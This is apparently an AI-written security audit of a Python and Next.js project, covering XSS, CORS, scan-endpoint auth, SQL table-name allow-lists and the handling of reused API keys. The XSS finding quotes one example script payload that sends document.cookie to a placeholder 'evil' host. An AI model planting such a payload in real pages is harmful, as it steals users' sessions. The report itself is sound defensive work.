# Intent Tracker — Security Audit

**Date:** 2026-04-21 (updated after remediation pass)
**Scope:** Complete codebase of `~/intent-tracker` (v1) as moved into `~/intent-tracker-v2`. Review covered both Python (api, scanner, scheduler, dashboard, processing, database) and TypeScript (Next.js web) layers.
**Methodology:** Manual code review + `pip-audit` + `npm audit` + runtime verification of auth / rate-limit behaviours.

---

## Findings

| ID | Severity | Status | Summary |
|----|----------|--------|---------|
| S-01 | **Critical** | **User-accepted** (keys reused) | Live secrets in `.env` — user opted to reuse the v1 keys |
| S-02 | High | **Fixed + moot** | XSS in Streamlit dashboard — fixed via `html.escape`, then the dashboard was removed entirely (2026-04-21) |
| S-03 | Medium | **Fixed** | CORS over-permissive + now origin allow-list fails closed outside dev |
| S-04 | Medium | **Fixed** | `/api/scan` now requires `X-Scan-Token` outside dev + 3-per-60s rate limit |
| S-05 | Medium | **Fixed** | Table-name arguments in dedup helpers now validated against allow-list |
| S-06 | Low | Not an issue | SQL queries in `core/queries.py` are parameterized — no SQL injection |
| S-07 | Low | **Fixed** | Next.js `lib/api.ts` hardcoded API URL — now reads `NEXT_PUBLIC_API_URL` |
| S-08 | Low | **Fixed** | DB path split-brain between `config/settings.py` and `database/db.py` |
| S-09 | Info | Noted | `lucide-react@1.8.0` flagged during review — verified as legitimate (upstream did a version reset) |
| S-10 | Low | **Fixed** | Python runtime pinned to 3.12 via `.python-version` for reproducibility |
| S-11 | Low | **Fixed** | `chain-logo.tsx` now shows an initials fallback (matching `project-logo.tsx`) |
| S-12 | Low | **Fixed** | `sys.path.insert` hack in `api/main.py` and `dashboard/app.py` |

---

## S-01 — Live secrets in .env (CRITICAL, user-accepted)

**Evidence.** `~/intent-tracker/.env` contained working `GITHUB_TOKEN` and `DUNE_API_KEY` values in plaintext.

**User decision (2026-04-21).** User opted to reuse the same keys in `~/intent-tracker-v2/.env` rather than rotate them. Risk accepted.

**Residual risk.**
- Keys now exist in two places: the v2 repo and the v1 backup `~/intent-tracker.bak.2026-04-21/.env`.
- Both keys were transmitted to this AI context during the migration session.
- `.gitignore` is hardened (`.env` excluded, only `.env.example` tracked), so the keys won't leak via git.

**Recommended follow-up.** When convenient, delete the backup snapshot (`rm -rf ~/intent-tracker.bak.2026-04-21`) to reduce the disk footprint of the keys, and consider rotating at the next natural breakpoint.

---

## S-02 — XSS via Streamlit `unsafe_allow_html` (HIGH, fixed)

**Evidence.** v1 `dashboard/theme.py` interpolated scanner-sourced strings (project name, description, website, chains) directly into HTML strings passed to `st.markdown(..., unsafe_allow_html=True)`. A crafted Reddit post titled `</div><script>fetch('//evil/?c='+document.cookie)</script>` would execute inside the dashboard browser session.

**Fix in v2.**
- `apps/dashboard/theme.py` runs every interpolated value through `html.escape`.
- URLs are validated to start with `http://` or `https://` before being emitted into an `<a href>`; links include `rel="noopener noreferrer"`.
- The remaining inline call in `apps/dashboard/app.py:329` (discovery name) now escapes `name`, `etype`, and `date`.

All other `unsafe_allow_html` calls in the dashboard pass either literal HTML or output from the escaping helper functions — grep verified.

---

## S-03 — CORS too permissive (MEDIUM, fixed)

**Evidence.** v1 `api/main.py` used `allow_methods=["*"]` + `allow_headers=["*"]` with `allow_credentials=True`. A footgun if `allow_origins` ever widens.

**Fix in v2.**
- `allow_methods` restricted to `["GET", "POST"]`.
- `allow_headers` restricted to `["Content-Type", "Authorization", "X-Scan-Token"]`.
- Origins now come from `settings.get_allowed_origins()` which:
  - In `ENVIRONMENT=dev` (default), uses `localhost:WEB_PORT` + `127.0.0.1:WEB_PORT`.
  - In staging/production, requires `ALLOWED_ORIGINS` env var; **fails closed** (empty list → browser blocks all cross-origin) if it is empty.
- `SCAN_TOKEN` is enforced at boot via a pydantic validator for any non-dev environment.

---

## S-04 — /api/scan auth + rate limit (MEDIUM, fixed)

**Evidence.** v1 `POST /api/scan` was unauthenticated. Anyone who could reach the endpoint could trigger arbitrary scans (CPU / API-quota burn, noise in logs).

**Fix in v2.**
- FastAPI dependency `require_scan_auth` checks `X-Scan-Token` header against `settings.scan_token`.
- In `ENVIRONMENT=dev` with `SCAN_TOKEN=""` the check is skipped (local-dev convenience).
- In staging/production, a boot-time pydantic validator rejects an empty `SCAN_TOKEN`.
- In-memory token-bucket rate limit: **3 scans per 60-second rolling window** (shared `deque`, `Lock`-guarded). 4th+ request returns `429` with a `Retry in Xs` message.
- Verified live: `curl -X POST /api/scan` without the token returned `401`; with the correct token returned `200`; 4th rapid POST returned `429`.

**Remaining nit.** The rate limit is per-process; a multi-worker deployment would need an out-of-process store (Redis). Fine for a single-worker dev/staging setup.

---

## S-05 — F-string table names in dedup helpers (MEDIUM, fixed)

**Evidence.** `apps/scanner/processing/dedup.py` interpolated a `table` argument directly into SQL (sqlite3 can't bind identifiers). Safe today because every call site passes a literal, but an SQLi-by-refactor was one `table=user_supplied_value` away.

**Fix in v2.**
- Added `_DEDUP_URL_TABLES = frozenset({"social_mentions"})` and `_DEDUP_TITLE_TABLES = frozenset({"social_mentions", "projects"})`.
- `_assert_allowed(table, allowed)` raises `ValueError` if `table` is outside the allow-list.
- Both `is_duplicate_url` and `is_duplicate_title` call the assertion before interpolating.

---

## S-06 — SQL injection in queries.py (NOT AN ISSUE)

**Evidence.** I audited every `conn.execute` / `conn.executescript` call in `core/queries.py`. Every query uses `?` placeholders or f-strings that only interpolate statically-generated placeholder strings (e.g. `", ".join(["?"] * len(present))`). Column names come from an allow-list (`cols = [...]`) with `present = [c for c in cols if c in project]`. Filter keys are matched against fixed strings (`if key == "date_from"`) — unknown keys are silently ignored.

**Conclusion.** Parameterized cleanly throughout. Good code.

---

## S-07 — Hardcoded API URL (LOW)

**Fix in v2.** `apps/web/src/lib/api.ts` now reads `process.env.NEXT_PUBLIC_API_URL` with a `http://localhost:8000` fallback. `.env.example` documents the var.

---

## S-08 — DB path split-brain (LOW)

**Evidence.** v1 had two sources of truth:
- `config/settings.py` → `PROJECT_ROOT / "data" / "intent_tracker.db"`
- `database/db.py` → `parent.parent / "intent_tracker.db"` (repo root)

The actual DB file lived at the repo root, which means any code that imported `settings.DB_PATH` would read/write a different (empty) DB file. Silent data loss waiting to happen.

**Fix in v2.** `packages/core/paths.py::DEFAULT_DB_PATH = DATA_DIR / "intent_tracker.db"` is the single source; `core.config.settings.db_path` defaults to it; `core.db` imports from `core.config`. The live DB was moved to `data/intent_tracker.db` during the restructure.

---

## S-09 — lucide-react@1.8.0 typosquat check (INFO)

I initially flagged `lucide-react@^1.8.0` as suspicious because the historical version of that package was pre-2021. Verified via `npm view lucide-react version` — upstream reset the version scheme; 1.x is current and legitimate. No action.

---

## S-10 — Python runtime pin (fixed)

v1 `.venv` was built with Python 3.9.6 (EOL Oct 2025). v2 now pins a concrete minor via `.python-version` (`3.12`), so `uv sync` resolves to 3.12.x on every machine rather than drifting to whatever `>=3.11` selects (the initial bootstrap picked 3.14 on this laptop).

---

## S-11 — Logo fallback UI (fixed)

`project-logo.tsx` already rendered an initials badge on image error. `chain-logo.tsx` previously hid the element silently, which masked data issues (e.g. a chain added to the scanner but not to `CHAIN_SLUGS`).

**Fix in v2.** `chain-logo.tsx` now uses the same `useState(imgError)` pattern as `project-logo.tsx` — on failure, render a deterministic colored circle with the chain's initial, sized to match the requested `size` prop. No hidden elements.

---

## S-12 — `sys.path.insert` hacks (LOW)

**Fix in v2.** Removed from `apps/api/main.py` and `apps/dashboard/app.py`. Path resolution is centralized in `scripts/_env.sh` (`PYTHONPATH` set once) and `packages/core/paths.py` (canonical filesystem paths).

---

## Automated scans

**Python (`uv run pip-audit`):** `No known vulnerabilities found` across all 70+ transitive dependencies.

**Node (`npm audit --workspaces`):** `found 0 vulnerabilities` across 713 packages.

---

## Remaining recommended follow-ups (not blocking)

1. **Rotate `GITHUB_TOKEN` and `DUNE_API_KEY` eventually** (S-01). User reuse accepted for now.
2. **Delete `~/intent-tracker.bak.2026-04-21`** once v2 is confirmed stable — reduces the on-disk footprint of the live keys.
3. **Move scan rate-limit to Redis** if/when deploying multi-worker (S-04). Current limit is per-process.
4. **Consider `httpx` + shared session with retries** across scanners instead of bare `requests`. Reduces SSRF-ish surface if a config file is tampered with and improves observability.
5. **Add `ALLOWED_ORIGINS` + `SCAN_TOKEN` + `ENVIRONMENT=production`** to the deployment config when the site goes live.

## Verification commands

```bash
cd ~/intent-tracker-v2

# Dependency audits
uv run pip-audit                  # → No known vulnerabilities found
npm audit --workspaces            # → found 0 vulnerabilities

# Functional smoke tests
bash scripts/run_api.sh &         # start API
curl -s -X POST http://localhost:8000/api/scan                                # 401 when SCAN_TOKEN set
curl -s -X POST -H "X-Scan-Token: <token>" http://localhost:8000/api/scan     # 200
# fire 4 rapid POSTs → the 4th returns 429
```
